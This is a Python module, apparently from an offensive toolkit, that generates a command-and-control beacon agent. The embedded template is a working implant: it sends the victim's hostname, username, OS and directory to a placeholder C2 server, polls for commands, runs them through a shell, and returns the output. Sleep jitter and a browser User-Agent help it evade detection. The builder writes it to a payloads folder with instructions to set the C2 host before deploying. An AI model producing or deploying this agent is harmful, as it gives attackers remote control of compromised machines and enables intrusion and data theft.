"""agent_builder — generate Python agent template for C2"""
from pathlib import Path

TEMPLATE = '''
# omni_agent.py — minimal HTTP beacon agent (template)
# EDIT: C2_HOST, SLEEP, JITTER before use
import os, time, random, subprocess, base64, socket, platform
import urllib.request, json

C2_HOST = "http://YOUR-C2:8000"
SLEEP   = 30
JITTER  = 15
UA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def beacon(data):
    try:
        req = urllib.request.Request(C2_HOST + "/beacon",
            data=json.dumps(data).encode(),
            headers={"User-Agent": UA, "Content-Type":"application/json"})
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read().decode() or "{}")
    except Exception:
        return {}

def exec_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, timeout=30).decode(errors="ignore")
    except Exception as e:
        return f"error: {e}"

def sysinfo():
    return {
        "host": socket.gethostname(),
        "user": os.environ.get("USER") or os.environ.get("USERNAME"),
        "os": platform.platform(),
        "pid": os.getpid(),
        "cwd": os.getcwd(),
    }

def main():
    beacon({"type":"init", "info": sysinfo()})
    while True:
        cmd = beacon({"type":"poll", "info": sysinfo()}).get("cmd")
        if cmd:
            out = exec_cmd(cmd)
            beacon({"type":"result", "output": out[:8000]})
        time.sleep(SLEEP + random.randint(-JITTER, JITTER))

if __name__ == "__main__":
    main()
'''

class AgentBuilder:
    def run(self, session, logger):
        out_dir = Path("payloads") / "c2"
        out_dir.mkdir(parents=True, exist_ok=True)
        script = out_dir / "omni_agent.py"
        script.write_text(TEMPLATE)
        print(f"[c2:agent_builder] template written: {script}")
        print(f"  edit C2_HOST + SLEEP before deploying")
        logger.info("c2_agent_built", path=str(script))
        return {"path": str(script)}
